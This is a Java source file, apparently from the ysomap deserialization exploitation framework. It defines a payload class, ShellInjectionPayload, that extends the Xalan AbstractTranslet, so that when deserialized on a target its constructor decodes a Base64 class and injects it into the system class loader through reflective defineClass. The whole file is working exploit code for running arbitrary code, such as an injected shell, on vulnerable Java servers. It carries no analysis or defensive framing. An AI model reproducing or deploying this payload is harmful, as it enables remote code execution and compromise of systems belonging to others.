package ysomap.core.bullet.jdk.customTranslet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;
import java.util.Base64;

public class ShellInjectionPayload extends AbstractTranslet implements Serializable {

    private static final String code = "";//
    private static final String cname = "";//

    public ShellInjectionPayload() {
        try {
            byte[] bytes1 = Base64.getDecoder().decode(code.getBytes());
            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            m.setAccessible(true);
            m.invoke(java.lang.ClassLoader.getSystemClassLoader(), cname, bytes1, 0, bytes1.length);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
